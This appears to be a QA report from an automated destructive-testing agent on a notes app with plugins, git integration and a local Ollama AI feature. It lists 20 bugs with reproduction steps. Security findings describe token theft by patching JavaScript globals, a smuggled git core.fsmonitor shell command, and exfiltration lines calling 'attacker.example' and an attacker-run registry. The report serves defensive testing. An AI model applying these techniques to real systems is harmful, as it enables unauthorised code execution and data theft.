# QA cycle 2 – agent B (destructive tester)

Date: 2026-11-01 · Commit under test: `8e2191c` (branch main) · Tester: agent B, cycle 2.

## Environment

- Debian (kernel 6.12), 1 CPU, 1.7 GB RAM shared with agent A (running in parallel), Python 3.13, PyQt6 /
  Qt WebEngine 6.8, git 2.47 installed, no Java. A real Ollama (container `skoffice-ollama`) listens on
  `localhost:11434`; the SKAI tests used fake servers on other ports.
- Every app run: one instance at a time, under Xvfb through `qa/cdp.py`, CDP ports 9550–9569, inside
  `systemd-run --user --scope -p MemoryMax=700M -p MemorySwapMax=100M`, `TMPDIR=qa/tmp/agent-B2/tmp`.
- All scripts, vaults and outputs are in `qa/tmp/agent-B2/` (outputs: `out/`, `out2/`, `c1/out/`, `sec2.out`).
  Run any script with `TMPDIR=$PWD/qa/tmp/agent-B2/tmp systemd-run --user --scope -q -p MemoryMax=700M -p MemorySwapMax=100M python3 -u qa/tmp/agent-B2/<script>`.
- `c1/` holds copies of the cycle-1 agent-B scripts (only paths fixed), used to re-check B-1…B-26.

## What was covered

- **Plugin permission system**: caller tokens (prototype/global patching, re-loading another plugin,
  window.open pop-ups across a reload, navigating the main window, data: URLs), protected files (all
  write routes of the API, `createUnique`, `plugins.remove`), loading disabled plugins, nested vaults and
  `vaults.open`, git integration, symlinks, other plugins' settings, network isolation (WebRTC, Ollama as a
  proxy, link clicks, opening HTML files, images, fetch), `system.openPath` launchers.
- **Data integrity**: CRLF/CR/mixed/BOM/NUL/binary/Latin-1 notes, read-only and unreadable notes,
  read-only vault, external edits shortly after an autosave, external rename/delete while editing,
  continuous typing + SIGKILL, SIGKILL during a 1000-note folder rename (4 points + 3 from cycle 1),
  `sknotes://new … overwrite`, deleting the vault root, non-UTF-8 and NFD file names, corrupt
  `.sk_notes` databases / journal, folder copy with symlink loops.
- **Robustness**: YAML alias bombs (cycle-1 bomb + 9×10 000 aliases), parser on pathological input,
  40 MB note, 12 000-note vault (start-up, folder rename, note creation bursts), 6×40 tabs, pop-outs,
  plugins: never-resolving `onload`, endless loop + safe mode after SIGTERM/SIGKILL, SKAI against a
  stalled, flooding, never-answering and byte-dribbling fake Ollama.

**Not covered**: disk full (no way to simulate ENOSPC without root; `ulimit -f` kills with SIGXFSZ
instead), read-only *remount*, the window close button on a frozen page (no tool to send
WM_DELETE_WINDOW under Xvfb – see note under B2-19 below), Wayland, real network exfiltration to the
Internet (only local listeners were used), `.jar`/`.exe` handlers (not installed).

---

## Critical

### B2-1: Navigating the main window to a vault HTML file hands it the boot secret → every plugin's token → programs run without permission
**Severity:** critical
**Steps to reproduce:** `qa/tmp/agent-B2/sec7_nav.py vault`. Plugin `evil` (every permission denied) writes
`evil.html` into the vault with `app.vault.adapter.write` and sets `location.href = 'skn://vault/evil.html'`.
`evil.html` reads `window.__sknBoot.token`, calls `skn://api/plugins.tokens` with it, and calls
`shim.exec` with the token of plugin `trusted` (exec: allow), then navigates back to `skn://app/index.html`.
**Expected:** the boot secret exists only for `skn://app/index.html`; foreign documents never get it.
**Actual:** `nav-pwn.txt` = `nav-vault` is written outside the vault; no dialog. `Page._new_boot()` runs on
every `loadStarted` of the main page and injects the secret at DocumentCreation whatever URL is loaded;
`acceptNavigationRequest` accepts every `skn://` URL, including `skn://vault/…` (attacker-written HTML).
(A `data:` URL variant, `sec7_nav.py data`, did not work.)

### B2-2: A `window.open()` pop-up survives a reload of the main page and steals the new boot secret
**Severity:** critical
**Steps:** `qa/tmp/agent-B2/sec4_popup.py`. Plugin `evil`: `w = window.open('about:blank')`, `w.eval(code)`
where `code` polls `opener.__sknBoot` in a `MessageChannel` loop, then `location.reload()`. The pop-up
catches the fresh secret before `core/api.js` deletes it, trades it at `plugins.tokens` and runs
`shim.exec` with `trusted`'s token.
**Expected:** a reload cannot leak the secret to pages that already exist.
**Actual:** `popup-pwn.txt` created outside the vault, no dialog. The pop-up page itself gets no secret
(`boot=False`), but as a same-origin opener-linked page it can read the opener's window after the reload.

### B2-3: Other plugins' tokens can be stolen by patching globals (passive) or by wrapping `Function` and reloading the victim (active)
**Severity:** critical
**Steps:** `qa/tmp/agent-B2/sec2.py` (probes `stolen_passive`, `exec_with_stolen_passive`, `reload_trusted`).
1. Passive: `evil` replaces `window.encodeURIComponent` and `Array.prototype.push`; `core/api.js url()`
   calls both with the caller token of whichever plugin makes a shim call (`trusted` hashes with
   `require('crypto')` once a second; `requestUrl`, `fs`, `loadData`-style calls do the same).
   One token captured in 3 s; `shim.exec` with it → `exec-passive.txt` written outside the vault.
2. Active: `evil` replaces `window.Function` with a wrapper that prepends its code, then
   `app.plugins.unloadPlugin('trusted'); app.plugins.loadPlugin('trusted')` – the manager compiles the
   victim with `new Function(...)` and the injected code runs with the victim's `require`
   (`child_process` with exec: allow) → `exec-fn.txt` written.
**Expected:** tokens never reach code a plugin can replace (the comment in `core/api.js` says the browser
functions are captured before plugins run, but `encodeURIComponent`, `Array.prototype.push/join`,
`Object.entries`, `JSON.stringify`, and `Function` in `plugins/manager.js` are looked up at call time).
**Actual:** both variants run programs with another plugin's permission, no dialog.

### B2-4: Any plugin (or page code) runs shell commands through the Git integration
**Severity:** critical
**Steps:** `qa/tmp/agent-B2/sec2.py` probes `git_init`, `git_config`, `git_status`:
`raw('git.init')`, then `raw('vault.write', {path: '.git/config', text: <old> + '[core]\n\tfsmonitor = "echo pwned-by-git > OUT/git-pwn.txt; false"'})`,
then `raw('git.status')`.
**Expected:** `.git/` is not writable from the page/plugins, or git runs with hooks/fsmonitor disabled.
**Actual:** `git-pwn.txt` = `pwned-by-git` outside the vault. `git.*` routes have no caller check,
`check_plugin_write` protects only `.sk_notes/`, and git executes `core.fsmonitor` (also
`core.hooksPath`, `.git/hooks/*`, `core.sshCommand` on push…). The status bar / git view calls
`git.status` by itself, so a single file write is enough.

### B2-5: A plugin prepares a nested vault and opens it: its plugins run with pre-granted `exec`, no confirmation
**Severity:** critical
**Steps:** `qa/tmp/agent-B2/sec3_nested.py`. Plugin `evil` (all denied) writes, with
`app.vault.adapter.write`, `sub/.sk_notes/{app.json (restrictedMode false), community-plugins.json,
permissions.json ({payload: {exec: allow}, __trusted__: [payload]}), plugins/payload/{manifest.json,main.js}}`
and calls `skn://api/vaults.open {path: <vault>/sub}` → `{"opened": "new-window"}`.
**Expected:** permission files are protected wherever they are; opening a vault whose plugins were never
confirmed on this machine asks first (trust prompt / restricted mode).
**Actual:** a second sk_notes process opens `sub`, loads `payload` and runs `echo pwned` → file created
4 s later; no dialog (all confirmations answered "no"). The same holds for any vault the user opens
(shared, synced, `git clone`d): `.sk_notes/permissions.json` and `community-plugins.json` from the vault
are trusted as is, so a downloaded vault runs code on open.

## High

### B2-6: A plugin can load another installed but **disabled** plugin and use that plugin's permissions
**Severity:** high
**Steps:** `sec2.py` probe `load_disabled`: plugin `dormant` is installed, not enabled, has exec: allow;
`evil` calls `this.app.plugins.loadPlugin('dormant')`.
**Expected:** only enabled plugins load; disabling a plugin removes its rights.
**Actual:** `dormant` loads (`window.__dormant = 'loaded'`) and runs a program (`exec-dormant.txt`).
`plugins.tokens` issues tokens for every installed plugin, enabled or not.

### B2-7: Protected plugin files written through `vault.createUnique`; plugins removed and re-enabled without a dialog
**Severity:** high
**Steps:** `sec2.py` probes `createUnique_*`, `remove_victim`, `replant_*`, `enable_victim`:
- `raw('vault.createUnique', {folder: '', base: '.sk_notes/plugins/planted/main', ext: 'js', text})` →
  creates `.sk_notes/plugins/planted/main.js` (and `manifest.json`, and `.sk_notes/x.json`):
  `vault.createUnique` is the only write route without `check_plugin_write` (also `system.importFiles`'
  `folder`).
- `raw('plugins.remove', {id: 'victim'})` uninstalls another plugin (folder + settings deleted) with no
  confirmation; `__trusted__` keeps `victim`; `evil` re-creates `victim/main.js` with its own code via
  `createUnique` and `raw('plugins.setEnabled', {id: 'victim', enabled: true})` succeeds **without** the
  "Enable plugin?" dialog (it is still trusted). `community-plugins.json` afterwards: `["trusted","evil","victim"]`.
**Expected:** plugin folders/code writable only by install; removal asks; trust is dropped on removal.
**Actual:** as above (only a brand-new id, `planted`, still gets the dialog → `cancelled`).

### B2-8: Deleting the path `''`/`'/'` deletes the whole vault folder, including `.sk_notes` and the version history
**Severity:** high (irreversible data loss caused by a common plugin bug)
**Steps:** `qa/tmp/agent-B2/sec6_delroot.py adapter` and `sec6_delroot.py fs`: a plugin with every
permission denied and a typical bug – its "folder" setting is still empty – calls
`app.vault.adapter.rmdir(settings.folder, true)` (resp. `require('fs').rmSync(basePath + '/' + folder, {recursive: true})`).
Offline: `qa/tmp/agent-B2/off_delroot.py` (`VaultService.delete('')` in each trash mode).
**Expected:** the vault root (and `.sk_notes`) can never be deleted through the API.
**Actual:** in both runs `vault folder exists: False` – the 20 notes, `.sk_notes/permissions.json`,
plugin code and `history.db` are gone permanently (`adapter.rmdir/remove` use mode `permanent`).
With mode `system` the whole vault is moved to the system trash; with `local` it fails with a raw
`shutil.Error`. `normalize_path('')` = `'/'` passes `check_plugin_write`, `Vault.abs('/')` returns the
root, and `shim.fs` accepts `path == root` for `rm`.

### B2-9: Plugins without `network`/`open-external` can send vault data out
**Severity:** high
**Steps:** `qa/tmp/agent-B2/sec5_net.py` (attacker listeners on local ports; `xdg-open` replaced by a
logger in `qa/tmp/agent-B2/bin/`). Plugin with every permission denied:
1. `new RTCPeerConnection({iceServers: [{urls: 'stun:127.0.0.1:18701'}, …]})` → 10 UDP STUN packets reach
   the listener (WebRTC does not go through `NetworkGuard`; a remote STUN/TURN host works the same way).
2. `fetch('http://localhost:11434/api/pull', {name: '172.17.0.1:18700/exfil/secret-from-vault:latest', insecure: true})`
   → the real Ollama requests `GET /v2/exfil/secret-from-vault/manifests/latest` from the attacker host:
   the one allowed host is a proxy to any registry (and can download multi-GB models).
3. `a = document.createElement('a'); a.href = 'https://attacker.example/?leak=SECRET'; a.click()` →
   `xdg-open https://attacker.example/?leak=SECRET` (same for `mailto:…?body=SECRET`): a synthetic click
   counts as `NavigationTypeLinkClicked` and opens the browser without `open-external`.
4. `system.openPath('leak/index.html')` and `publish.open({folder: <vault>/leak})` (no caller check) open a
   plugin-written HTML page in the browser → `<img src="https://attacker/?leak=…">`.
**Expected:** offline unless a plugin holds `network`; external URLs only with `open-external`.
**Actual:** all four channels work (control: `<img src=http://127.0.0.1:18702>` in the page is blocked).

### B2-10: One file name that is not valid UTF-8 makes the vault impossible to open (crash at start-up)
**Severity:** high
**Steps:** `qa/tmp/agent-B2/t3_startup.py badname` (vault with `Caf\xe9.md`, a Latin-1 name as found in
old zip/Samba archives). Offline: `qa/tmp/agent-B2/off_names.py`.
**Expected:** the file is skipped or listed with a replacement name; the vault opens.
**Actual:** the process exits before the window appears:
`index.py line 185 _index_file … UnicodeEncodeError: 'utf-8' codec can't encode character '\udce9' … surrogates not allowed`
(from `SkNotesApp.open_vault` → `VaultService.open` → `index.sync`). Every later start fails the same way.

### B2-11: An external change made within 2 s after sk_notes saved the note is ignored and overwritten – no notice, not in history
**Severity:** high (silent loss of another program's / sync tool's changes)
**Steps:** `qa/tmp/agent-B2/t2b_echo.py` (and `t2_ext_history.py`): open a note, type, wait until the
app's autosave changes the file's mtime, `d` seconds later append `EXTERNAL LINE` from Python, type again,
wait 5 s.
**Expected:** reload, or the conflict notice and the external version in the version history (what the
notice promises).
**Actual:**
```
external write 0.5s after the app's save: on disk False, in history False, notices []
external write 1.5s after the app's save: on disk False, in history False, notices []
external write 3.0s after the app's save: on disk True,  in history False, notices []
```
`VaultService.is_own_echo()` ignores every watcher event for a path for 2 s after any own write, and the
editor's saves send no `expectedMtime`, so the next autosave silently replaces the external text. While
typing, the app saves at least every 4 s, so the blind window covers a large part of an editing session.
Also, `external_change` snapshots with `force=False`: an external version arriving < 300 s after the
last snapshot is not stored even when it *is* detected (the 3.0 s case: not in history).

## Medium

### B2-12: `vault.write` / `adapter.write` write through a symlinked folder to outside the vault without `fs-outside-vault`
**Severity:** medium
**Steps:** `sec2.py` probes `vault_write_symlink`, `adapter_write_symlink` (vault contains `outlink -> ../outside`).
**Expected:** like the Node `fs` shim since B-4: the real target decides; writing outside needs the permission.
**Actual:** `outside/pwned-vw.txt` and `pwned-ad.txt` are created. `Vault.abs()` accepts any path whose
parent *is* a symlink. With a user link such as `home -> ~`, a plugin can write `home/.bashrc`.

### B2-13: `sknotes://new?file=X&overwrite=true&silent=true` empties a note and keeps no copy of the old text
**Severity:** medium
**Steps:** `qa/tmp/agent-B2/t2_ext_history.py` (second part): `Victim.md` never edited in sk_notes;
second process `main.py "sknotes://new?vault=v2-exthist&file=Victim&overwrite=true&silent=true&content="`.
**Expected:** a snapshot of the previous content before an overwrite (as for restores/renames), or a confirmation.
**Actual:** `Victim.md` is now `''`; history holds one `edit` snapshot with `''`. Any web page can trigger
such a link (one browser confirmation), with no visible window change.

### B2-14: SKAI: a reply line that never ends exhausts memory in the Python process (OOM)
**Severity:** medium
**Steps:** `qa/tmp/agent-B2/t4_ai.py flood` (`fake2.py flood`: `/api/chat` streams `A`s with no newline).
**Expected:** a line-length/size limit; error "answer could not be read"; Stop works.
**Actual:** Python PSS 382 → 529 → 560 → 648 MB within 6 s, then the scope is OOM-killed
(`journalctl`: `run-p158300….scope: Failed with result 'oom-kill'`) before the test's cancel at 12 s.
`chat_stream` iterates `for raw in resp` (unbounded `readline`). Without a cgroup it would take the whole machine.

### B2-15: A slow-but-alive Ollama starves the 4 worker threads: search and all other slow API calls hang
**Severity:** medium
**Steps:** `qa/tmp/agent-B2/t4_ai.py dribble` (`/api/tags` sends one byte every 2 s: each read is under
`LIST_TIMEOUT`, so the request lasts minutes). 5 `app.skai.refreshStatus()` calls, then `search.query`.
**Expected:** search answers at once (as in cycle 1 with a hanging server).
**Actual:** `search.query` did not answer within 65 s (`WebSocketTimeoutException` waiting for the result).
`ai.status` runs in the shared 4-thread pool and the page calls it every 60 s without de-duplication,
so after ~4 minutes with an overloaded Ollama, search, `vault.snapshot`, git, retrieval etc. stop answering.

### B2-16: Copying a folder that contains symlink loops runs unbounded (disk filling)
**Severity:** medium
**Steps:** `qa/tmp/agent-B2/off_copyloop.py` (`F/a -> .`, `F/b -> .`; `VaultService.copy('F', 'G')`,
reachable through `vault.copy` / `app.vault.copy(folder)` / `adapter.copy`).
**Expected:** loops skipped as in `Vault.scan()` (B-10 fix).
**Actual:** after 8 s still running, 4 718 files / 38 MB under `G` and growing exponentially
(`shutil.copytree` follows symlinked folders).

### B2-17: Opening a 40 MB note runs the app out of memory
**Severity:** medium
**Steps:** `qa/tmp/agent-B2/t3_startup.py huge` (`Huge.md`, 40 MB of short lines; `MB=` env to change).
**Expected:** large files opened read-only/plain or refused with a message (they are already excluded
from indexing above 8 MB).
**Actual:** start-up fine (311 MB), opening the note → scope OOM-killed at 700 MB
(`journalctl`: `oom-kill`, 700M peak). Note the 700 MB cap; on the real 1.7 GB machine it may survive
somewhat larger files, but nothing stops a bigger one.

### B2-18: Big vaults: a folder rename freezes the UI for ~23 s and every note creation costs ~0.4 s
**Severity:** medium
**Steps:** `qa/tmp/agent-B2/t7_big.py` and `t7b_create.py` (12 000 notes in 12 folders, 2 links each).
**Actual:** start-up 20.3 s, PSS 483 MB. Renaming `F00` (1 000 notes): done in 25.3 s, but a trivial
JS evaluation took **22.8 s** – the window does not respond meanwhile (`vault.rename` runs on the UI thread).
Creating notes: 1 → 0.4 s, 20 sequential → 8.8 s, 50 concurrent → 14.6 s, 300 concurrent → not finished
after 300 s (each `create` event carries the full `resolvedLinks`/`unresolvedLinks` maps). Template,
import or daily-note plugins that create many notes freeze the app.

## Low

### B2-19: A plugin can overwrite other plugins' settings and clear their permission answers
**Severity:** low
**Steps:** `sec2.py` probes `other_data_json` (`raw('config.write', {name: 'plugins/trusted/data.json', data: {command: 'evil'}})`
→ ok, file replaced) and `perm_unset` (`raw('plugins.permissions', {id: 'trusted', set: {network: null}})` →
`trusted`'s `network: deny` answer removed without any dialog).
**Expected:** a plugin's data.json is that plugin's; removing answers is a settings-UI action.
**Actual:** both succeed (raw page calls carry no token, so they count as the app). Combined with a plugin
that keeps a command line in its settings, this is a way to make it run other commands.

### B2-20: `rename-journal.json` with valid JSON that is not an object makes the vault unopenable
**Severity:** low
**Steps:** `qa/tmp/agent-B2/off_corrupt.py` case `journal-list` (`[1,2]`; `null` behaves the same).
**Actual:** `VaultService.open()` raises `TypeError: list indices must be integers…` (only `ValueError`/`KeyError` are handled);
other corrupt cases (garbage `cache.db`/`history.db`, DBs that are folders, `.sk_notes` being a file, journal
pointing outside the vault) are handled.

## Cosmetic issues

- The safe-mode question is shown in the system language even when the test harness sets `LANG=en_US`
  (log: `confirm 'Modalità sicura'`) – probably the saved language setting; not checked further.
- `Vault.abs`/trash: deleting the root in `local` mode fails with a raw `shutil.Error` text (B2-8).

---

## Regression check of cycle-1 fixes (B-1 … B-26)

| Bug | Status | Evidence |
|---|---|---|
| B-1, B-2, B-3, B-5, B-21 | fixed for the original probes (`qa/security.py` passes); **bypassed** by B2-1…B2-7, B2-9 | `sec2.py`, `sec3…7` |
| B-4 symlinks | fixed in the `fs` shim; still open in `vault.write` (B2-12) | `sec2.py` |
| B-6 silent rewrite | fixed (binary, Latin-1, CRLF, mixed, CR, BOM, NUL unchanged) | `c1/out/t_silent_rewrite.py.txt` |
| B-7 unreadable note | fixed (read-only, notice, file untouched) | `c1/out/t_perms_fs.py_inside.txt` |
| B-8 stale editor | fixed for the original scenario; new race B2-11 | `c1/out/t_stale_editor.py_conflict.txt` |
| B-9 YAML bomb | fixed (starts in 6 s, 319 MB); 9×10 000 aliases also fine | `c1/out/…yamlbomb.txt`, `out/t3_startup.py_bigfm.txt` |
| B-10 symlink loops | fixed for scanning; still open for folder copy (B2-16) | `c1/out/…symloop.txt` |
| B-11 read-only vault | fixed (opens, notes read-only) | `c1/out/t_perms_fs.py_rovault.txt` |
| B-12 autosave while typing | fixed (64 of 78 words on disk after SIGKILL) | `c1/out/t_kill2.py_typing.txt` |
| B-13 kill during rename | no broken state found: 7 kill points, always all-or-nothing, 0 unresolved after restart (the rename now takes < 4 s, so the journal phases were not caught) | `out2/t9_killrename.py.txt`, `c1/out/t_kill2.py_rename.txt` |
| B-14 NFD names | fixed (opens, edit saved to the NFD file); the explorer-click probe was inconclusive (clicks did not register for any file in this harness) | `t10_nfd.py` |
| B-15 SKAI stop on stall | fixed (`cancelled` 0.1 s after cancel; also with a server that never sends headers) | `c1/out/t_ollama.py_stall.txt`, `out/t4_ai.py_preheaders.txt` |
| B-16 external rename | fixed (tab follows, one file) | `c1/out/t_external.py.txt` |
| B-17 0444 notes | fixed | `c1/out/t_perms_fs.py_inside.txt` |
| B-18 long names | fixed (253-byte note saved, 250-byte created) | `c1/out/t_names2.py.txt` |
| B-19 never-ending onload | fixed (later plugins load, app ready) | `c1/out/t_bad_plugins.py_never.txt` |
| B-20 looping plugin | fixed: after SIGKILL or SIGTERM of a frozen app, the next start offers safe mode and starts without plugins | `out/t8_safemode.py_{kill,term}.txt` |
| B-22/B-23 pathological notes | parser times unchanged (deep list 2000 levels 4.5 s, 5 MB line 5.4 s; linear in bytes); no crash | `c1/t_parser_time.py` |
| B-24 XDG | fixed (`c1/t_ollama.py` had to be changed to the XDG path) | — |
| B-25, B-26 | not re-checked | — |

## Attacks that failed (app held up)

- `data:` URL navigation of the main window to read the boot secret (`sec7_nav.py data`).
- Writing `permissions.json`/`community-plugins.json`/plugin code through `vault.write`, `config.write`,
  `vault.rename`; enabling a brand-new planted plugin (`plugins.setEnabled` → native dialog → cancelled);
  `system.openPath` on `x.DESKTOP` (refused); remote `<img>` (blocked).
- Rename journal pointing outside the vault (`../evil.md`) – not written; garbage/odd `.sk_notes` content
  (`off_corrupt.py`) – vault opens.
- Notes: binary/Latin-1/CRLF/CR/mixed/BOM/NUL notes never rewritten by browsing; read-only and
  unreadable notes protected; external rename/delete while editing handled; dirty note + external edit
  (outside the 2 s window) → notice; 5 000 files created externally indexed in 15.5 s; file replaced by a folder handled.
- SIGKILL while typing and at 7 points of a 1000-note folder rename: no half-written notes, links consistent.
- YAML alias bombs (both shapes), deep lists/quotes/brackets, 10 000 links: no crash, no OOM.
- Plugins: never-resolving `onload`, endless loop (safe mode offered next start, app usable),
  throwing plugins (cycle-1 suite).
- SKAI: stalled stream and a server that never answers: Stop acts in ~0.1 s, UI and search stay responsive.
- Memory: 6 rounds × 40 tabs opened/closed – heap and DOM node count flat, PSS flat (219 + 74 MB);
  3 pop-outs opened and closed – no growth in the main renderer.

## Notes

- The SIGTERM variant of `t8_safemode.py` also signalled the `xvfb-run` wrapper, so the X server died
  first; that run therefore does not prove that a *clean* SIGTERM/window close of a frozen page keeps the
  safe-mode marker. Reading `main.py`: SIGTERM and the window close button both end in `app.quit()`,
  which deletes the marker – a user who closes a window frozen by a plugin would then not be offered safe
  mode. Not reproduced (no WM_DELETE_WINDOW tool), so not filed.
- `vaults.create` (no caller check) can create folders anywhere and then spawns a process on them; seen
  in code only, not run (it would start a second app instance).
- B2-15 and B2-17 depend on memory/timeouts of this small machine; the mechanisms are not environment-specific.

## Summary

20 bugs: **5 critical** (B2-1 boot secret given to any page the main window loads; B2-2 pop-up steals it
across a reload; B2-3 token theft by patching globals / `Function`; B2-4 shell commands through Git
`core.fsmonitor`; B2-5 nested/foreign vault plugins run with pre-granted exec), **6 high** (disabled
plugins loadable; protected plugin code writable and plugins removable/re-enabled without dialog; vault
root deletable with history; four network/exfiltration channels; non-UTF-8 file name crashes start-up;
external changes silently lost within 2 s of an autosave), **7 medium** (symlinked-folder writes outside
the vault, `sknotes://` overwrite without snapshot, SKAI flood OOM, worker-pool starvation by a slow
Ollama, folder copy with symlink loops, 40 MB note OOM, UI freeze/slow creates in a 12 000-note vault),
**2 low**. Cycle-1 fixes hold for their original reproductions (B-6…B-20, B-24 verified), but the
permission redesign is bypassable in several independent ways.
